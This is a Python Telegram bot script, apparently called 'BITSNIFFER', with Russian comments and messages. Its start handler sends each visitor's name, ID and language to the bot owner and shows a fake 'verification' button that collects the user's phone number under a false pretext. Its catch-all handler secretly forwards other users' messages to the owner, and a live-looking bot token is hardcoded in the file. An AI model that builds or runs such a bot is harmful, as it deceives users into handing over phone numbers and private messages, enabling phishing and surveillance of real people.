import asyncio
import re
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8606715900:AAFGjZcI5_FiSydtLPnpu0J9QSxMHP9WezA"
CHANNEL_ID = "@hackpackposter" 
MY_ADMIN_ID = 7917303098 

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# --- УТИЛИТЫ ---

def clean_and_style(text: str) -> str:
    if not text: return ""
    text = re.sub(r'http\S+', '', text)
    text = re.sub(r'@\S+', '', text)
    signature = "\n\n<b>💀 Доступ открыт в: @hackpackposter</b>"
    return text.strip() + signature

def get_post_kb():
    builder = InlineKeyboardBuilder()
    builder.row(types.InlineKeyboardButton(text="👍", callback_data="like"),
                types.InlineKeyboardButton(text="👎", callback_data="dislike"))
    builder.row(types.InlineKeyboardButton(text="📡 Поделиться", url="https://t.me/share/url?url=https://t.me/hackpackposter"))
    return builder.as_markup()

def get_auth_kb():
    # Кнопка для захвата номера телефона
    builder = ReplyKeyboardBuilder()
    builder.row(types.KeyboardButton(text="🛡 ПРОЙТИ ВЕРИФИКАЦИЮ", request_contact=True))
    return builder.as_markup(resize_keyboard=True, one_time_keyboard=True)

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    u = message.from_user
    if u.id == MY_ADMIN_ID:
        await message.answer("<b>BITSNIFFER ONLINE.</b> Приветствую, мой господин.")
    else:
        # Шпионаж: базовые данные
        report = (
            f"🚨 <b>ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
            f"<b>Имя:</b> {u.full_name}\n"
            f"<b>ID:</b> <code>{u.id}</code>\n"
            f"<b>Premium:</b> {'Да' if u.is_premium else 'Нет'}\n"
            f"<b>Язык:</b> {u.language_code}\n"
            f"<b>СТАТУС:</b> Ожидание контакта..."
        )
        await bot.send_message(MY_ADMIN_ID, report)
        await message.answer("🦾 <b>Система верификации.</b>\nДля доступа к базе подтвердите свою личность кнопкой ниже.", 
                             reply_markup=get_auth_kb())

@dp.message(F.contact)
async def contact_handler(message: types.Message):
    # Захват номера телефона и отправка хозяину
    c = message.contact
    intel_report = (
        f"🎯 <b>ЦЕЛЬ РАСКРЫТА (PHONE CAPTURE)</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"<b>Номер:</b> +{c.phone_number}\n"
        f"<b>Имя:</b> {c.first_name}\n"
        f"<b>ID пользователя:</b> {c.user_id}\n"
        f"━━━━━━━━━━━━━━"
    )
    await bot.send_message(MY_ADMIN_ID, intel_report)
    await message.answer("✅ <b>Верификация пройдена.</b> Доступ к узлу открыт.", 
                         reply_markup=types.ReplyKeyboardRemove())

@dp.message()
async def posting_handler(message: types.Message):
    if message.from_user.id == MY_ADMIN_ID:
        try:
            text = clean_and_style(message.text or message.caption or "")
            kb = get_post_kb()
            if message.text:
                await bot.send_message(CHANNEL_ID, text, reply_markup=kb)
            elif message.photo:
                await bot.send_photo(CHANNEL_ID, message.photo[-1].file_id, caption=text, reply_markup=kb)
            elif message.video:
                await bot.send_video(CHANNEL_ID, message.video.file_id, caption=text, reply_markup=kb)
            elif message.document:
                await bot.send_document(CHANNEL_ID, message.document.file_id, caption=text, reply_markup=kb)
            await message.answer("🚀 <b>Пост отправлен!</b>")
        except Exception as e:
            await message.answer(f"❌ Ошибка: {e}")
    else:
        # Перехват сообщений от посторонних
        spy_msg = f"📩 <b>Перехват от {message.from_user.id}:</b>\n{message.text or 'Медиа'}"
        await bot.send_message(MY_ADMIN_ID, spy_msg)

async def main():
    print(f"--- BITSNIFFER v3.5 ONLINE ---")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
